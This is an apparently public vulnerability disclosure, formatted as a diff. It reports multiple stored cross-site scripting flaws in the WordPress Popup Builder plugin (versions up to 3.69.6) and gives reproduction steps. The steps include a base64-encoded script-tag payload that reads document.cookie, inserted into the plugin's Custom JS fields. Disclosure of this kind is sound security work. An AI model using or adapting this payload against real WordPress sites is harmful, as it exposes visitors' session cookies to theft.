@@ -1,0 +1,73 @@
+# Exploit Title: WordPress Plugin Popup Builder 3.69.6 - Multiple Stored Cross Site Scripting
+# Date: 11/27/2020
+# Exploit Author: Ilca Lucian Florin
+# Vendor Homepage: https://sygnoos.com
+# Software Link: https://wordpress.org/plugins/popup-builder/ / https://popup-builder.com/
+# Version: <= 3.69.6
+# Tested on: Latest Version of Desktop Web Browsers: Chrome, Firefox, Microsoft Edge
+
+The Popup Builder – Responsive WordPress Pop up – Subscription & Newsletter
+Plugin is vulnerable to stored cross site scripting. There are multiple
+parameters vulnerable to cross site scripting.
+
+All versions up to 3.69.6 are vulnerable to stored cross site scripting.
+
+More information about this plugin could be found on the following links:
+
+1. https://wordpress.org/plugins/popup-builder/
+2. https://popup-builder.com/
+
+Cross site scripting (XSS) is a common attack vector that injects malicious
+code into a vulnerable web application. XSS differs from other web attack
+vectors (e.g., SQL injections), in that it does not directly target the
+application itself. Instead, the users of the web application are the ones
+at risk. A successful cross site scripting attack can have devastating
+consequences for an online business’s reputation and its relationship with
+its clients. Stored XSS, also known as persistent XSS, is the more damaging
+of the two. It occurs when a malicious script is injected directly into a
+vulnerable web application.
+
+# How to reproduce #
+
+1. Login as Editor or Administrator: https://website.com/wp-login/
+
+2. Go to the following link:
+https://website.com/wp-admin/edit.php?post_type=popupbuilder or search for
+PopUp Builder and select or create new PopUp.
+
+2. Click edit
+
+3. Search and find: # Custom JS or CSS
+
+4. On JS -> Opening events section, add two payloads, one for #2 section
+and one for #3 section, like in the following example:
+
+#2 Add the code you want to run before the popup opens. This will be the
+code that will work in the process of opening the popup. true/false
+conditions will not work in this phase.
+
+<textarea class="wp-editor-area editor-content" data-attr-event="WillOpen"
+placeholder=" #... type your code" mode="text/javascript"
+name="sgpb-WillOpen">"><script
+src="data:;base64,YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="></script></textarea>
+
+#3 Add the code you want to run after the popup opens. This code will work
+when the popup is already open on the page.
+
+<textarea class="wp-editor-area editor-content" data-attr-event="DidOpen"
+placeholder=" #... type your code" mode="text/javascript"
+name="sgpb-DidOpen">"><script
+src="data:;base64,YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="></script></textarea>
+
+5. Click Update
+
+6. Go to https://website.com. The XSS alert will pop up.
+
+# All text-areas from JS section are vulnerable to stored cross site
+scripting.
+
+Evidence:
+
+1. https://ibb.co/JvBTq0H
+2. https://ibb.co/0KP7NFQ
+3. https://ibb.co/3cFnVYF
